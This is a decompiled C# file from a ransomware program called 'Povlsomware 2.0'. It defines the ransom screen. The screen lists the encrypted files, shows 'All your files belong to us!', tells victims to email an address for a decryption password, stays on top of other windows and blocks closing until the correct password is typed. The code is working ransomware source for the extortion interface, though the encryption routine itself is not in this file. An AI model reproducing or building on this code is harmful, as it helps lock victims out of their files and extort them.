using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;

namespace Povlsomware;

public class PayM3 : Form
{
	private bool success = false;

	private IContainer components = null;

	private TextBox textBox1;

	private Button button1;

	private Label label1;

	private Label label2;

	private ListBox listBox1;

	private Label label3;

	private TextBox textBox2;

	private PictureBox pictureBox1;

	private BackgroundWorker backgroundWorker1;

	public PayM3()
	{
		InitializeComponent();
		((Control)label2).set_Text(Program.count + " files have been encrypted");
		ObjectCollection items = listBox1.get_Items();
		object[] array = Program.encryptedFiles.ToArray();
		items.AddRange(array);
		((Control)textBox2).set_Text("Your files can only be retrived by entering the correct password. \n\rIn order to get the password please send a mail to \n\rno-reply@forgetit.com.");
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		string text = ((Control)textBox1).get_Text();
		if (text == Program.GetPass())
		{
			success = true;
			((Control)button1).set_Text("Decrypting... Please wait");
			backgroundWorker1.RunWorkerAsync(text);
		}
		else
		{
			((Control)textBox1).set_Text(string.Empty);
			((ContainerControl)this).set_ActiveControl((Control)(object)textBox1);
			((Control)button1).set_Text("Wrong Password... ");
		}
	}

	private void Screen_FormClosing(object sender, FormClosingEventArgs e)
	{
		if (!success)
		{
			((CancelEventArgs)(object)e).Cancel = true;
		}
	}

	private void PayM3_Load(object sender, EventArgs e)
	{
		((Control)this).Show();
	}

	private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
	{
		string decryption_password = e.Argument as string;
		Program.UndoAttack(decryption_password);
	}

	private void backgroundWorker1_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
	{
		Application.Exit();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0094: Unknown result type (might be due to invalid IL or missing references)
		//IL_009e: Expected O, but got Unknown
		//IL_00bf: Unknown result type (might be due to invalid IL or missing references)
		//IL_011c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0126: Expected O, but got Unknown
		//IL_0147: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01de: Expected O, but got Unknown
		//IL_020e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0287: Unknown result type (might be due to invalid IL or missing references)
		//IL_0291: Expected O, but got Unknown
		//IL_02c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_0345: Unknown result type (might be due to invalid IL or missing references)
		//IL_03c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_043b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0445: Expected O, but got Unknown
		//IL_0473: Unknown result type (might be due to invalid IL or missing references)
		//IL_04e5: Unknown result type (might be due to invalid IL or missing references)
		//IL_04ef: Expected O, but got Unknown
		//IL_050a: Unknown result type (might be due to invalid IL or missing references)
		//IL_065b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0665: Expected O, but got Unknown
		//IL_066a: Unknown result type (might be due to invalid IL or missing references)
		//IL_06b5: Unknown result type (might be due to invalid IL or missing references)
		//IL_06bf: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(PayM3));
		textBox1 = new TextBox();
		button1 = new Button();
		label1 = new Label();
		label2 = new Label();
		listBox1 = new ListBox();
		label3 = new Label();
		textBox2 = new TextBox();
		pictureBox1 = new PictureBox();
		backgroundWorker1 = new BackgroundWorker();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		((Control)textBox1).set_Font(new Font("Microsoft Sans Serif", 10f));
		((Control)textBox1).set_Location(new Point(57, 318));
		((Control)textBox1).set_Margin(new Padding(2, 3, 2, 3));
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(209, 23));
		((Control)textBox1).set_TabIndex(0);
		((Control)button1).set_BackColor(SystemColors.InactiveCaption);
		((Control)button1).set_Font(new Font("Microsoft Sans Serif", 12f));
		((Control)button1).set_Location(new Point(57, 343));
		((Control)button1).set_Margin(new Padding(2, 3, 2, 3));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(208, 47));
		((Control)button1).set_TabIndex(1);
		((Control)button1).set_Text("Please decrypt them!");
		((ButtonBase)button1).set_UseVisualStyleBackColor(false);
		((Control)button1).add_Click((EventHandler)Button1_Click);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)1));
		((Control)label1).set_ForeColor(SystemColors.ButtonFace);
		((Control)label1).set_Location(new Point(301, 6));
		((Control)label1).set_Margin(new Padding(2, 0, 2, 0));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(215, 20));
		((Control)label1).set_TabIndex(2);
		((Control)label1).set_Text("All your files belong to us!");
		label1.set_TextAlign((ContentAlignment)32);
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("Microsoft Sans Serif", 8f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_ForeColor(SystemColors.ButtonFace);
		((Control)label2).set_Location(new Point(301, 33));
		((Control)label2).set_Margin(new Padding(2, 0, 2, 0));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(41, 13));
		((Control)label2).set_TabIndex(3);
		((Control)label2).set_Text("label2");
		((ListControl)listBox1).set_FormattingEnabled(true);
		listBox1.set_HorizontalScrollbar(true);
		((Control)listBox1).set_Location(new Point(304, 49));
		((Control)listBox1).set_Margin(new Padding(2, 3, 2, 3));
		((Control)listBox1).set_Name("listBox1");
		((Control)listBox1).set_Size(new Size(615, 355));
		((Control)listBox1).set_TabIndex(4);
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_ForeColor(SystemColors.ButtonFace);
		((Control)label3).set_Location(new Point(54, 296));
		((Control)label3).set_Margin(new Padding(2, 0, 2, 0));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(83, 13));
		((Control)label3).set_TabIndex(5);
		((Control)label3).set_Text("Enter password:");
		textBox2.set_AcceptsReturn(true);
		((Control)textBox2).set_BackColor(Color.Maroon);
		((Control)textBox2).set_Font(new Font("Microsoft Sans Serif", 10f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)textBox2).set_ForeColor(SystemColors.ButtonFace);
		((Control)textBox2).set_Location(new Point(57, 172));
		((Control)textBox2).set_Margin(new Padding(2));
		((TextBoxBase)textBox2).set_Multiline(true);
		((Control)textBox2).set_Name("textBox2");
		((TextBoxBase)textBox2).set_ReadOnly(true);
		((Control)textBox2).set_Size(new Size(209, 107));
		((Control)textBox2).set_TabIndex(6);
		textBox2.set_TextAlign((HorizontalAlignment)2);
		pictureBox1.set_Image((Image)componentResourceManager.GetObject("pictureBox1.Image"));
		((Control)pictureBox1).set_Location(new Point(113, 19));
		((Control)pictureBox1).set_Margin(new Padding(2));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(162, 149));
		pictureBox1.set_TabIndex(0);
		pictureBox1.set_TabStop(false);
		backgroundWorker1.DoWork += backgroundWorker1_DoWork;
		backgroundWorker1.RunWorkerCompleted += backgroundWorker1_RunWorkerCompleted;
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.Maroon);
		((Form)this).set_ClientSize(new Size(959, 441));
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Control)this).get_Controls().Add((Control)(object)textBox2);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)listBox1);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_Margin(new Padding(2, 3, 2, 3));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("PayM3");
		((Control)this).set_RightToLeft((RightToLeft)0);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("Povlsomware 2.0");
		((Form)this).set_TopMost(true);
		((Form)this).add_FormClosing(new FormClosingEventHandler(Screen_FormClosing));
		((Form)this).add_Load((EventHandler)PayM3_Load);
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
